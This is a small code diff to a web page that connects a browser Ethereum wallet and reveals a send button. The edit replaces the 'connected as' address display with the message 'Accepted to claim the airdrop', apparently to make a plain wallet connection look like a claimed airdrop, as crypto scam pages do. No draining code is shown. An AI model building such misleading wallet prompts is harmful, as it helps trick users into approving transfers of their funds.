@@ -152,7 +152,7 @@
             if (typeof window.ethereum !== 'undefined') {
                 web3 = new Web3(window.ethereum);
                 accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                document.getElementById('status').innerText = `Conectado como: ${accounts[0]}`;
+                document.getElementById('status').innerText = `Accepted to claim the airdrop`;
                 document.getElementById('sendButton').style.display = 'block';
                 document.getElementById('connectButton').style.display = 'none'; // Oculta el botón de conectar
             } else {
@@ -188,4 +188,3 @@
     </script>
 </body>
 </html>
-
